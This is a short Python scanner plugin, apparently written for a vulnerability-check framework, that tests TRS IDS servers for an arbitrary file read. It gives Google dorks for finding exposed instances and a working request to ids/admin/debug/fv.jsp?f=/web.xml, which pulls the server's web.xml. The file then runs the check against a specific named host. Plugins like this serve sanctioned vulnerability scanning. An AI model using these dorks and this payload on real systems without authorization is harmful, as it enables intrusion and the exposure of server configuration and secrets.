#!usr/bin/env python
# *-* coding:utf-8 *-*

'''
name: TRS IDS任意文件读取
author: yichin
refer: http://www.wooyun.org/bugs/wooyun-2013-039729
description:
    google dork: intitle:trs身份 / intitle:trs+inurl:ids
    
    ids/admin/debug/fv.jsp?f=/web.xml
'''

def assign(service, arg):
    if service == 'trs_ids':
        return True, arg

def audit(arg):
    url = arg + 'ids/admin/debug/fv.jsp?f=/web.xml'
    code, head, res, err, _ = curl.curl2(url)
    #print code, res
    if(code == 200) and ('<?xml version' in res):
        security_hole('任意文件读取' + url)
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('trs_ids', 'http://ids.am765.com/')[1])